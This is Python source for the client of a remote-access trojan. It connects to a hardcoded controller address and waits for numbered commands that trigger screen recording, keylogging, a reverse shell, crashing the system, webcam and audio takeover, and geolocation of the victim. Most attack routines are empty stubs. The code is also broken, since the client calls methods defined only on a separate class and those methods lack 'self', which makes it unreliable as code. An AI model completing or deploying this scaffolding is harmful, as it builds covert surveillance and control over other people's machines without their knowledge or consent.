from keyboard import *
import socket
from time import sleep
import pyautogui

class Client:
#client code starts here:
    def __init__(self):
        self.host = "172.17.105.160"
        self.port = 9090
        self.route = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def connection_to_server(self):
        try:
            self.route.connect((self.host, self.port))
            print("connection established: ")
            self.messaging()
        except ConnectionRefusedError as err:
            print("SORRY YOU CANNOT CONNECT TO THE BLACKSHEEP HOST")

        except KeyboardInterrupt:
            print("\n YOU CLOSED THE CONNECTION")
            self.route.close()
    
    def messaging(self):
            self.data_from_blacksheep = self.route.recv(1024).decode("utf-8")
            print(self.data_from_blacksheep)
            if self.data_from_blacksheep == "1":
                #screen recording goes here
                self.screen_record()
                pass
            if self.data_from_blacksheep == "2":
                #keylogger codes goes here
                self.keylogger()
                pass
            if self.data_from_blacksheep == "3":
                #screen reverse shell goes here
                self.reverse_shell()
                pass
            if self.data_from_blacksheep == "4":
                #crashing the entire systemclear

                self.crash_sys()
                pass
            if self.data_from_blacksheep == "5":
                #take over cameras and audio
                self.webcam()
                pass
            if self.data_from_blacksheep == "6":
                #get the exact locations
                self.geolocate()
                pass
            if self.data_from_blacksheep == "7":
                #get the exact locations
                self.chat()
                pass
            else:
                print("no match found")

    def main(self):
        self.connection_to_server()
#client code ends here:

class AttackModes:
    def __init__(self):
        pass
    
    #screen recording goes here
    def screen_record():
        pass

    #keylogger codes goes here 
    def keylogger():
        pass

    #screen reverse shell goes here
    def reverse_shell():
        pass

    #crashing the entire system
    def crash_sys():
        pass

    #take over cameras and audio
    def webcam():
        pass

    #get the exact locations
    def geolocate():
        pass

    def chat(self):
        while True:
            self.data_from_blacksheep = self.route.recv(1024).decode("utf-8")
            print(self.data_from_blacksheep)
            if not self.data_from_blacksheep or self.data_from_blacksheep == "END":
                #incase there is no data from blacksheep {self destruct}
                break

S = Client()
S.main()